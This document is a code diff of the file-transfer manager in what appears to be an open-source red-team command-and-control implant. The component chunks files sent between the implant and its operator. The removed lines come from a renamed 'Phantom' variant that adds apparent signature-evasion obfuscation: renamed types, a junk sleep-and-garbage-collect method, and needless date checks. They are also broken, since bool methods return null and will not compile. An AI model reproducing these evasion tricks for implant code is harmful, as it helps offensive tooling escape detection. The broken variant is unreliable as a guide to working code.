@@ -1,63 +1,58 @@
-﻿using PhantomInterop.Classes.Core;
-using PhantomInterop.Classes.Events;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+﻿using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Events;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
 using System.Threading;
-using PhantomInterop.Classes.Cryptography;
+using ApolloInterop.Classes.Cryptography;
 
-namespace Phantom.Management.Files
+namespace Apollo.Management.Files
 {
-    public sealed class DataHandler : IFileManager
+    public sealed class FileManager : IFileManager
     {
         private int _chunkSize = 512000;
         private IAgent _agent;
         private IEncryptedFileStore _fileStore;
 
-        public DataHandler(IAgent agent)
+        public FileManager(IAgent agent)
         {
             _agent = agent;
             _fileStore = new EncryptedFileStore.EncryptedFileStore(
                 new ICryptographicRoutine[]
                 {
                     new AesRoutine(),
-                    
-                    
-                    
-                    
+                    // In the future, we should allow composible encryption routines;
+                    // however, due to how impersonation and DPAPI interact,
+                    // we can't use DPAPI to encrypt files.
+                    // new DpapiRoutine(System.Guid.NewGuid().ToByteArray()),
                 });
         }
 
         internal struct UploadMessageTracker
         {
             internal AutoResetEvent Complete;
-            internal ChunkStore<MythicTaskStatus> DataStore;
+            internal ChunkedMessageStore<MythicTaskStatus> MessageStore;
             internal byte[] Data;
             private CancellationToken _ct;
-            internal UploadMessageTracker(CancellationToken ct, bool initialState = false, ChunkStore<MythicTaskStatus> store = null, byte[] data = null)
+            internal UploadMessageTracker(CancellationToken ct, bool initialState = false, ChunkedMessageStore<MythicTaskStatus> store = null, byte[] data = null)
             {
                 _ct = ct;
                 Complete = new AutoResetEvent(initialState);
-                DataStore = store == null ? new ChunkStore<MythicTaskStatus>() : store;
+                MessageStore = store == null ? new ChunkedMessageStore<MythicTaskStatus>() : store;
                 Data = data;
             }
         }
 
-        
+        // Annoyingly, we need a separate struct as Download task responses don't have 
         public class DownloadMessageTracker
         {
-    private static void Zc3d4e5()
-    {
-        Thread.Sleep(Random.Next(1, 5));
-        GC.Collect();
-    }
             public AutoResetEvent Complete = new AutoResetEvent(false);
             public List<MythicTaskStatus> Statuses = new List<MythicTaskStatus>();
-            public event EventHandler<ChunkEventData<MythicTaskStatus>> ChunkAdd;
-            public event EventHandler<ChunkEventData<MythicTaskStatus>> AllChunksSent;
+            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> ChunkAdd;
+            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> AllChunksSent;
             private CancellationToken _ct;
             public int TotalChunks { get; private set; }
             public string FilePath { get; private set; }
@@ -94,11 +89,11 @@ namespace Phantom.Management.Files
                 Statuses.Add(t);
                 if (ChunksSent == TotalChunks || t.StatusMessage == "error" || _ct.IsCancellationRequested)
                 {
-                    AllChunksSent?.Invoke(this, new ChunkEventData<MythicTaskStatus>(new MythicTaskStatus[] { t }));
+                    AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[] { t }));
                     Complete.Set();
                 } else
                 {
-                    ChunkAdd?.Invoke(this, new ChunkEventData<MythicTaskStatus>(new MythicTaskStatus[]{ t }));
+                    ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[]{ t }));
                 }
             }
         }
@@ -108,17 +103,17 @@ namespace Phantom.Management.Files
         
         public string[] GetPendingTransfers()
         {
-            if(DateTime.Now.Year > 2020) { return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray(); } else { return null; }
+            return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray();
         }
 
         public void ProcessResponse(MythicTaskStatus resp)
         {
             if (_uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
             {
-                
+                // This is an upload message response, send it along.
                 if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
                 {
-                    _uploadMessageStore[resp.ApolloTrackerUUID].DataStore.AddMessage(resp);
+                    _uploadMessageStore[resp.ApolloTrackerUUID].MessageStore.AddMessage(resp);
                 }
             } else
             {
@@ -129,7 +124,7 @@ namespace Phantom.Management.Files
             }
         }
 
-        private void FileManager_MessageComplete(object sender, ChunkEventData<MythicTaskStatus> e)
+        private void FileManager_MessageComplete(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
         {
             List<byte> data = new List<byte>();
             for(int i = 0; i < e.Chunks.Length; i++)
@@ -177,7 +172,7 @@ namespace Phantom.Management.Files
             });
             _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
             mythicFileId = itemTracker.FileID;
-            if(DateTime.Now.Year > 2020) { return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks; } else { return null; }
+            return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
         }
 
         public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
@@ -188,8 +183,8 @@ namespace Phantom.Management.Files
                 if (!_uploadMessageStore.ContainsKey(taskID))
                 {
                     _uploadMessageStore[uuid] = new UploadMessageTracker(ct, false);
-                    _uploadMessageStore[uuid].DataStore.ChunkAdd += MessageStore_ChunkAdd;
-                    _uploadMessageStore[uuid].DataStore.MessageComplete += FileManager_MessageComplete;
+                    _uploadMessageStore[uuid].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
+                    _uploadMessageStore[uuid].MessageStore.MessageComplete += FileManager_MessageComplete;
                 }
             }
             _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
@@ -226,10 +221,10 @@ namespace Phantom.Management.Files
                 TaskID = taskID,
                 Status = "Using file...",
             });
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
 
-        private void MessageStore_ChunkAdd(object sender, ChunkEventData<MythicTaskStatus> e)
+        private void MessageStore_ChunkAdd(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
         {
             MythicTaskStatus msg = e.Chunks[0];
             _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
@@ -246,7 +241,7 @@ namespace Phantom.Management.Files
             });
         }
 
-        private void DownloadChunkSent(object sender, ChunkEventData<MythicTaskStatus> e)
+        private void DownloadChunkSent(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
         {
             DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
             var msg = new MythicTaskResponse()
@@ -269,7 +264,7 @@ namespace Phantom.Management.Files
 
         public string GetScript()
         {
-            if(DateTime.Now.Year > 2020) { return _fileStore.GetScript(); } else { return null; }
+            return _fileStore.GetScript();
         }
 
         public void SetScript(string script)
@@ -279,12 +274,12 @@ namespace Phantom.Management.Files
 
         public bool AddFileToStore(string keyName, byte[] data)
         {
-            if(DateTime.Now.Year > 2020) { return _fileStore.TryAddOrUpdate(keyName, data); } else { return null; }
+            return _fileStore.TryAddOrUpdate(keyName, data);
         }
 
         public bool GetFileFromStore(string keyName, out byte[] data)
         {
-            if(DateTime.Now.Year > 2020) { return _fileStore.TryGetValue(keyName, out data); } else { return null; }
+            return _fileStore.TryGetValue(keyName, out data);
         }
 
         public void SetScript(byte[] script)
